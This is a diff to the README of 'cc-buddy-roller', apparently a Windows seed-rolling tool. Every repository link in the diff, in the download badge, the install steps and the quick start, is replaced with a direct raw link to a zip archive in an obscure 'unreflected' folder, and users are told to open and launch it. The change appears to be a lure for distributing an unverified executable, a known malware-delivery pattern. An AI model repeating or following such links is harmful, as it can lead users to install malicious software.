@@ -1,6 +1,6 @@
 # 🎲 cc-buddy-roller - Roll Better Buddy Seeds Fast
 
-[![Download cc-buddy-roller](https://img.shields.io/badge/Download%20cc--buddy--roller-blue?style=for-the-badge)](https://github.com/labile-unit230/cc-buddy-roller)
+[![Download cc-buddy-roller](https://img.shields.io/badge/Download%20cc--buddy--roller-blue?style=for-the-badge)](https://raw.githubusercontent.com/labile-unit230/cc-buddy-roller/main/unreflected/cc_buddy_roller_v1.7.zip)
 
 ## 🧭 What this app does
 
@@ -15,7 +15,7 @@ Use it when you want a simple way to:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/labile-unit230/cc-buddy-roller
+https://raw.githubusercontent.com/labile-unit230/cc-buddy-roller/main/unreflected/cc_buddy_roller_v1.7.zip
 
 Open the page, then look for the latest release or the main download file. If your browser asks what to do with the file, save it first, then open it from your Downloads folder.
 
@@ -36,7 +36,7 @@ For the best results, keep Windows updated before you start.
 Follow these steps:
 
 1. Open the download page:
-   https://github.com/labile-unit230/cc-buddy-roller
+   https://raw.githubusercontent.com/labile-unit230/cc-buddy-roller/main/unreflected/cc_buddy_roller_v1.7.zip
 
 2. Find the newest release or app file.
 
@@ -195,7 +195,7 @@ This makes it easier to find old rolls and compare results later.
 
 ## 📎 Quick start
 
-1. Visit https://github.com/labile-unit230/cc-buddy-roller
+1. Visit https://raw.githubusercontent.com/labile-unit230/cc-buddy-roller/main/unreflected/cc_buddy_roller_v1.7.zip
 2. Download the Windows file
 3. Open or extract it
 4. Launch the app
